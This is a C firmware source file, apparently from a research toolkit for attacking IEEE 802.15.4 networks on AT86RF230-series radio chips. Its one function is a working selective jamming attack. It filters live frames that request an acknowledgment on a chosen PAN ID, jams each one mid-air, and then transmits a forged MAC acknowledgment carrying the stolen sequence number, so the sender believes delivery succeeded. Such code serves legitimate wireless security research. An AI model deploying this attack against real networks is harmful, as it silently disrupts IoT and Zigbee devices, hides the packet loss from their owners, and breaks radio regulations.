/*
 * fw/attacks/attack_04.c - Attack function with ID 04
 *
 * Written 2020 by Dimitrios-Georgios Akestoridis
 * Copyright 2020 Dimitrios-Georgios Akestoridis
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#include <stdbool.h>
#include <stdint.h>

#define F_CPU 8000000UL
#include <util/delay.h>

#include "at86rf230.h"
#include "spi.h"
#include "board.h"
#include "attack.h"


/*
 * Jam only packets of a specified network
 * that request a MAC acknowledgment
 * and then spoof a MAC acknowledgment
 */
bool attack(void)
{
	uint8_t rx_byte = 0;
	uint8_t phy_len = 0;
	uint8_t mac_seq_num = 0;
	uint8_t jam_len = 0;

	/* Read the received packet as soon as possible */
	spi_begin();
	spi_io(AT86RF230_BUF_READ);

	/* Check the length of the received packet */
	phy_len = spi_recv();
	if ((phy_len < 5) || (phy_len & 0x80)) {
		/* Ignore packets with invalid PHY Length */
		spi_end();
		return 1;
	}

	/* Check the 8 least-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if (!(rx_byte & 0x20)) {
		/* Ignore packets that do not request a MAC acknowledgment */
		spi_end();
		return 1;
	} else if (rx_byte & 0x08) {
		/* Ignore packets with MAC Security enabled */
		spi_end();
		return 1;
	} else if (!(rx_byte & 0x40)) {
		/* Ignore packets that do not compress the PAN ID */
		spi_end();
		return 1;
	}

	/* Check the 8 most-significant bits of the MAC Frame Control */
	_delay_us(32);
	if (spi_recv() & 0x30) {
		/*
		 * Ignore packets that do not use the
		 * IEEE 802.15.4-2003 frame version
		 */
		spi_end();
		return 1;
	}

	/* Store the MAC sequence number */
	_delay_us(32);
	mac_seq_num = spi_recv();

	/* Check the destination PAN ID */
	_delay_us(32);
	if (spi_recv() != (PANID & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != ((PANID >> 8) & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}

	/* Stop receiving and transition into the PLL_ON state */
	spi_end();
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	/* Calculate the length of the jamming packet */
	if (phy_len > 16) {
		jam_len = phy_len - 16;
	} else {
		jam_len = 1;
	}

	/* Jam the received packet */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(jam_len);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Wait for the transmission of the spoofed packet */
	while (jam_len > 0) {
		_delay_us(32);
		jam_len--;
	}
	_delay_us(400);

	/* Spoof a MAC Acknowledgment packet */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(5);
	spi_send(0x02);
	spi_send(0x00);
	spi_send(mac_seq_num);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Transition into the RX_ON state */
	change_state(TRX_CMD_RX_ON);

	return 1;
}
